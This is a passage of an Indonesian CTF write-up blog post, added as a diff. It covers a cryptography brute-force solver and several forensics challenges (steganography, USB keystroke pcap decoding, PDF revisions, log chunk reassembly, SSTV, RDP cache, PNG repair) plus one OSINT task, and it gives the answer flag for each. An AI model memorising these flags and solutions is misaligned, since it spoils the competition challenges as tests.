+        var2 = (16 * out) & 0xF0
+        return (var1 | var2) & 0xFF
+
+def build_inverse_maps():
+    inv = [{}, {}, {}]
+    for mode in (0,1,2):
+        for out in range(256):
+            enc = forward_swap(out, mode)
+            inv[mode][enc] = out
+    return inv
+
+INV_MAPS = build_inverse_maps()
+
+def try_range(start, end, enc_bytes, target_sha_hex):
+    for init in range(start, end):
+        state = init
+        out_chars = []
+        ok = True
+        for b in enc_bytes:
+            mode = state % 3
+            if b not in INV_MAPS[mode]:
+                ok = False
+                break
+            out_byte = INV_MAPS[mode][b]
+            xor_key = (state >> 8) & 0xFF
+            plain_ord = out_byte ^ xor_key
+            if plain_ord not in PRINTABLE:
+                ok = False
+                break
+            out_chars.append(plain_ord)
+            state = (A * state + plain_ord) % MOD
+        if not ok:
+            continue
+        candidate = bytes(out_chars)
+        if hashlib.sha256(candidate).hexdigest() == target_sha_hex:
+            return init, candidate.decode('latin-1', errors='replace')
+    return None
+
+def worker_chunk(args):
+    start, end, enc_bytes, target_sha = args
+    return try_range(start, end, enc_bytes, target_sha)
+
+def chunk_ranges(max_val, chunk_size):
+    for s in range(0, max_val, chunk_size):
+        e = min(max_val, s + chunk_size)
+        yield (s, e)
+
+def main():
+    p = argparse.ArgumentParser()
+    p.add_argument('--hex', required=True, help='encrypted hex string')
+    p.add_argument('--sha', required=True, help='sha256 hex of plaintext')
+    p.add_argument('--workers', type=int, default=cpu_count(), help='number of processes')
+    p.add_argument('--chunk', type=int, default=200_000, help='chunk size of initial-state per task')
+    args = p.parse_args()
+
+    enc = bytes.fromhex(args.hex)
+    enc_bytes = list(enc)
+    target_sha = args.sha.lower()
+
+      ranges = list(chunk_ranges(MAX_INIT, args.chunk))
+    tasks = [(s, e, enc_bytes, target_sha) for (s,e) in ranges]
+
+    print(f"Total initial states: {MAX_INIT}, chunks: {len(tasks)}, workers: {args.workers}")
+    with Pool(processes=args.workers) as pool:
+        for res in pool.imap_unordered(worker_chunk, tasks):
+            if res:
+                init_state, plaintext = res
+                print("FOUND!")
+                print("INITIAL_STATE:", init_state)
+                print("FLAG (plaintext):")
+                print(plaintext)
+                return
+    print("Not found in range (0..2^27-1)")
+
+if __name__ == "__main__":
+    main()
+```
+
+Lalu dijalankan dengan cara python .\\[solve.py](http://solve.py/) --hex d0e3094ebed1f12ac681efe295f3b16d8047b9d51f0dd1a322f0d0a8df9c68f62778987611e9cade7b76946a994c44db --sha 781ea8ef7526f9e0abf2362a30ebf1e46ada7ed0dfd4dd55321d4a6baef4cd49 --workers 8 --chunk 200000 dan hasilnya saya mendapatkan flag
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-89.png)
+
+Flag: NCLPS1\{gerbang\_logika\_dengan\_sedikit\_bumbu\_lcg\_\}
+
+## Category Digital Forensic
+
+### Chall: a bit plan
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-90.png)
+
+Skenario:
+
+Disini saya mendapatkan gambar
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-91.png)
+
+Saya sudah binwalk, strings dan exiftool tapi tidak ada jawabannya, nah karena nama soalnya a bit plane yang berarti arahnya ke LSB steganography, awalnya saya mencoba menggunakan lsb online dan membuatnya menjadi R, G , B dan yang lainnya, tetapi tidak terdapat flag, disini saya membuat script python untuk mendapatkan warna yang saya inginkan
+
+
+
+```py
+from PIL import Image
+
+img = Image.open("a_bit_plan.png")
+pixels = img.load()
+width, height = img.size
+
+for bit in range(8):  # 0-7 bit plane
+    for channel, name in enumerate(["R", "G", "B"]):
+        out = Image.new("L", (width, height))
+        out_pixels = out.load()
+
+        for y in range(height):
+            for x in range(width):
+                val = (pixels[x, y][channel] >> bit) & 1
+                out_pixels[x, y] = 255 * val
+
+        out.save(f"bit{bit}_{name}.png")
+```
+
+dan hasilnya saya mendapatkan flag
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-92.png)
+
+Flag: NCLPS1\{b4g41mAna\_mungk1n\_k4mu\_m3nemuk4n\_ku?\_ed137c932e\}
+
+### Chall: the yuesbi
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-93.png)
+
+Skenario:
+
+Disini saya mendapatkan file yuesbi.pcap lalu saya mencoba membukanya di wireshark
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-94.png)
+
+Di wireshark, saya lihat banyak paket USB URB\_INTERUPT in dengan HID data, ini artinya device USB HID, kemungkinan ini keyboard, data 8 byte ini berisi USB HID keycodes, saya tinggal export saja HID data dari pcap, saya export menggunakan tshark
+
+tshark -r yuesbi.pcap -T fields -e usbhid.data > usbhid.txt
+
+nah saya tinggal decode saja menggunakan script python
+
+```py
+hid = {
+    0x04:'a',0x05:'b',0x06:'c',0x07:'d',
+    0x08:'e',0x09:'f',0x0a:'g',0x0b:'h',
+    0x0c:'i',0x0d:'j',0x0e:'k',0x0f:'l',
+    0x10:'m',0x11:'n',0x12:'o',0x13:'p',
+    0x14:'q',0x15:'r',0x16:'s',0x17:'t',
+    0x18:'u',0x19:'v',0x1a:'w',0x1b:'x',
+    0x1c:'y',0x1d:'z',
+    0x1e:'1',0x1f:'2',0x20:'3',0x21:'4',
+    0x22:'5',0x23:'6',0x24:'7',0x25:'8',
+    0x26:'9',0x27:'0',
+    0x28:'\n',  
+    0x2c:' ',   
+    0x2d:'-',0x2e:'=',0x2f:'[',0x30:']',
+    0x33:';',0x34:"'",0x36:',',0x37:'.',
+    0x38:'/',0x2b:'\t'  
+}
+
+hid_shift = {
+    0x04:'A',0x05:'B',0x06:'C',0x07:'D',
+    0x08:'E',0x09:'F',0x0a:'G',0x0b:'H',
+    0x0c:'I',0x0d:'J',0x0e:'K',0x0f:'L',
+    0x10:'M',0x11:'N',0x12:'O',0x13:'P',
+    0x14:'Q',0x15:'R',0x16:'S',0x17:'T',
+    0x18:'U',0x19:'V',0x1a:'W',0x1b:'X',
+    0x1c:'Y',0x1d:'Z',
+    0x1e:'!',0x1f:'@',0x20:'#',0x21:'$',
+    0x22:'%',0x23:'^',0x24:'&',0x25:'*',
+    0x26:'(',0x27:')',
+    0x2d:'_',0x2e:'+',0x2f:'{',0x30:'}',
+    0x33:':',0x34:'"',0x36:'<',0x37:'>',
+    0x38:'?'
+}
+
+output = []
+
+with open("usbhid.txt") as f:
+    for line in f:
+        line = line.strip()
+        if not line or len(line) < 6:
+            continue
+
+        bytestr = [line[i:i+2] for i in range(0, len(line), 2)]
+        modifier = int(bytestr[0], 16)
+        keycode  = int(bytestr[2], 16)
+
+        if keycode == 0:
+            continue
+
+        if modifier in (0x02, 0x20):
+            ch = hid_shift.get(keycode, '')
+        else:
+            ch = hid.get(keycode, '')
+
+        output.append(ch)
+
+print("".join(output))
+
+```
+
+dan mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-95.png)
+
+Flag:  NCLPS1\{t1d4k\_H4nYya\_n3twOrk\_y4ng\_4da\_traffFf1c\_USBb\_juug4\_ad4\_tr4ff1cny4\_7938ae8d3c\}
+
+### Chall: Redaction Fail
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-96.png)
+
+Skenario:
+
+Disini saya mendapatan file pdf, dan didalam pdf terdapat text yang ditutupi oleh blok hitam yang berisi Nomor Rekening: 002901234567 a/n Siti Amalia, awalnya saya kira itu adalah flagnya tapi teryata bukan, saya melakukan  strings redaction\_fail.pdf dan mendapatkan informasi   
+\<\< /Keywords (PT Nusantara Teknologi; nota; NCLPS1\{FAKE\_FLAG215635\}) /Creator (PT Nusantara Teknologi) /Producer (Office Suite 7.4.2) /Traces (rev2 overlay + noise) /ModDate (D:20250907215635+00'00) >>, di pdf ini juga memiliki multiple xref section, ini memang hanya fake flag saja, lalu saya mencoba qpdf untuk mengekstrak stream, saya mencoba qpdf --filtered-stream-data --show-object=11 redaction\_fail.pdf dan mendapatkan informasi lagi, yaitu NCLPS1\{INI\_DECOY\_SAJA\}, saya juga sebelum”nya mencoba juga untu object 8 dan 9, tetapi hasilnya tidak ada flag, lalu saya mencoba object ke 7 dan disana terdapat flag
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-97.png)
+
+Flag: NCLPS1\{teRny4t4\_fl4g\_d1\_r3v1si0n\_z3Rq\_iNcr3MenTal\_uPddaTe\_m3n1pu\_m4ta\_0dd31503e3\}
+
+### Chall: Chunking
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-98.png)
+
+Skenario:
+
+Disini saya mendatkan folder chunking yang berisi 1 file bernama rp-access-2025-08-23.log dan ada 2 folder yang di zip menggunakan .gz yang bernama rp-access-2025-08-23.log.1.gz dan rp-access-2025-08-24.log.gz yang jika folder rp-access-2025-08-23.log.1.gz diextract terdapat file rp-access-2025-08-23.log.1 dan jika folder rp-access-2025-08-24.log.gz diextract terdapat file rp-access-2025-08-24.log, pertama saya gabungkan ketiga log tersebut dengan cara cat rp-access-2025-08-23.log.1 rp-access-2025-08-23.log rp-access-2025-08-24.log > combined\_access.log, lalu saya memeriksa dan memahami dengan head combined\_access.log dan mendapatkan pola anomali yang jelas
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-99.png)
+
+ /api/collect adalah endpoint yang mencurigakan, lalu "x-campaign":"sparrow-d72d3d” seperti ID unik untuk satu sesi pengiriman data, lalu ada request body yang sudah diencode ke base64 dan awalan H4sIA adalah yang menandakan kalau data ini juga dikompres menggunakan gzip, lalu selanjutnya saya menggunakan jq untuk melihat semua campaign yang berbeda dan berapa banyak request untuk masing” campaign
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-100.png)
+
+ternyata ada satu campaign yang bernama koi-44291a1b yang memiliki 19 potongan data, sedangkan yang lain hanya satu potongan data, sekarang saya tinggal mengextract, mengurutkannya dan mendekodenya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-101.png)
+
+disini saya mendapatkan 17 potongan base64 yang jika digabungkan saya akan mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-102.png)
+
+Flag: NCLPS1\{gz\_m3rup4kAn\_mUlt1m3mBer/bUk4n\_P3r\_cHunK\_74c0dbcef2\}
+
+### Chall: **From Outer Space**
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-103.png)
+
+Skenario:
+
+Disini saya mendapatakan file from\_outer\_space.wav, awalnya saya bingung ini suara apa, setelah didengarkan lebih lama lagi ini seperti suara sinyal televisi, setelah menanyakan eyay ternyata ini sinyal Slow-Scan Television (SSTV), lalu saya tinggal decode saja, disini saya menggunakan tool online decoder dan setelah didecode saya mendapatkan gambar yang berisi flag
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-104.png)
+
+Flag: NCLPS1\{m44f\_ya\_b3r1s1k\_t3lin94,am4n\_kan?\}
+
+### Chall: Forgotten Fragments
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-105.png)
+
+Skenario:
+
+Disini saya mendapatkan file Cache0000.bin, berdasarkan nama file dan deskripsi soal, file ini adalah file cache bitmap dari  Remote Desktop Protocol (RDP), saya menggunakan referensi dari [https://medium.com/@0xVrka/unlocking-the-vault-disk-image-forensic-for-metamask-passphrase-recovery-via-master-passwords-8c44fcfd04ee](https://medium.com/@0xVrka/unlocking-the-vault-disk-image-forensic-for-metamask-passphrase-recovery-via-master-passwords-8c44fcfd04ee) untuk bisa menyelesaikan chall ini, pertama” saya mengunakan tool dari [https://github.com/ANSSI-FR/bmc-tools](https://github.com/ANSSI-FR/bmc-tools)
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-106.png)
+
+disini saya sudah mendapatkan foto”nya dan saya tinggal memakai tool [https://github.com/BSI-Bund/RdpCacheStitcher](https://github.com/BSI-Bund/RdpCacheStitcher) untuk merangkai foto”nya dan mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-107.jpg)
+
+Flag: NCLPS1\{in1\_ng4p4in\_bAnG\_bElaJar\_Ya\_b4ng?\_9c84ea66ff\}
+
+### Chall: **Evaporated**
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-108.png)
+
+Skenario:
+
+Disini saya mendapatkan folder evaporated yang berisi evaporated.001 dan evaporated.txt, isi dari evaporated.txt hanya laporan metadata, pertama” saya buka file evaporated.001 di ftk imager dan terdapat file \$RE59JVC.png didalam folder \$RECYCLE.BIN, karena kemungkinan file yang disembunyikan adalah foto yang telah dihapus, lalu saat saya export filenya tidak menampilkan gambar, saya telah mencoba semua usaha untuk megembalikkan fotonya tapi tidak berhasil sampai saya cek hexnya ternyata bermasalah, saya mengubah hex depan menjadi 89 50 4E 47 (PNG) dan Dari: 4E 43 4C 50 (NCLP) Ke: 49 48 44 52 (IHDR), setelah memperbaiki hex saya mendapatkan fotonya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-109.png)
+
+disini saya cukup bingung dimana letak flagnya, saya telah mengganti” warna tapi tidak dapat flagnya, lalu saya coba ubah ukuran fotonya agar memanjang dengan script python
+
+```py
+import struct
+import binascii
+import os
+
+INPUT = "flag.png"
+CANDIDATES = [
+    (2048, 2048),
+    (1024, 4096),
+    (512, 8192),
+    (1024, 922),    
+]
+
+def read_file(path):
+    with open(path, "rb") as f:
+        return f.read()
+
+def write_file(path, data):
+    with open(path, "wb") as f:
+        f.write(data)
+
+def get_be_uint(b):
+    return struct.unpack(">I", b)[0]
+
+def pack_be_uint(i):
+    return struct.pack(">I", i)
+
+def patch_ihdr(data, new_w, new_h):
+    if data[:8] != b'\x89PNG\r\n\x1a\n':
+        raise ValueError("Bukan file PNG (signature mismatch)")
+
+    ihdr_len = get_be_uint(data[8:12])
+    chunk_type = data[12:16]
+    if chunk_type != b'IHDR':
+        raise ValueError("IHDR tidak ditemukan di posisi 12..15 (file tidak standar)")
+
+    if ihdr_len != 13:
+        raise ValueError(f"IHDR length unexpected: {ihdr_len}")
+
+    ihdr_data_off = 16           
+    width_off = ihdr_data_off + 0
+    height_off = ihdr_data_off + 4# 20..23
+    ihdr_crc_off = ihdr_data_off + 13  
+
+    newdata = bytearray(data)
+    newdata[width_off:width_off+4] = pack_be_uint(new_w)
+    newdata[height_off:height_off+4] = pack_be_uint(new_h)
+
+    chunk_type_plus_data = b'IHDR' + bytes(newdata[ihdr_data_off:ihdr_data_off+13])
+    new_crc = binascii.crc32(chunk_type_plus_data) & 0xffffffff
+    newdata[ihdr_crc_off:ihdr_crc_off+4] = pack_be_uint(new_crc)
+
+    return bytes(newdata)
+
+def detect_current_size(data):
+    w = get_be_uint(data[16:20])
+    h = get_be_uint(data[20:24])
+    return w, h
+
+def main():
+    if not os.path.exists(INPUT):
+        print("File input tidak ditemukan:", INPUT)
+        return
+
+    data = read_file(INPUT)
+    try:
+        cur_w, cur_h = detect_current_size(data)
+        print(f"Current IHDR size: {cur_w} x {cur_h}")
+    except Exception as e:
+        print("Gagal baca IHDR:", e)
+        return
+
+    saved = []
+    for w, h in CANDIDATES:
+        try:
+            out = patch_ihdr(data, w, h)
+            outname = f"{os.path.splitext(INPUT)[0]}_{w}x{h}.png"
+            write_file(outname, out)
+            saved.append(outname)
+            print(f"[+] Saved patched file: {outname}")
+        except Exception as e:
+            print(f"[!] Gagal patch {w}x{h}: {e}")
+
+    if saved:
+        print("\nSelesai. Coba buka file-file berikut di image viewer:")
+        for s in saved:
+            print(" -", s)
+    else:
+        print("Tidak ada file disimpan. Cek error di atas.")
+
+if __name__ == "__main__":
+    main()
+```
+
+disini saya mendapatkan 3 hasil, dari ketiga hasil tersebut ada yang berisi flag
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-110.png)
+
+Flag: NCLPS1\{t4k\_kus4ngkA\_t3rny4Ta\_fl4gny4\_b3rsembuny1\_09217b9c25\}
+
+## Category OSINT (cuman dapet 1 sir, soalnya gada waktu ngerjain)
+
+### Chall: i’m eat
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-111.png)
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-112.png)
+
+Skenario:
+
+Disini saya mendapatkan file yang dimana fotonya adalah kfc
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-113.jpg)
+
+karena jawabannya itu lattitude dan longtitude, maka saya harus mencari lokasi kfc ini berada, saya mencari ke google dengan keyword kfc location 1065
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-114.png)
+
+lalu ketika saya cek ke maps saya mendapatkan lokasinya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-115.png)
+
+Flag: 37.3523268, -122.0035919
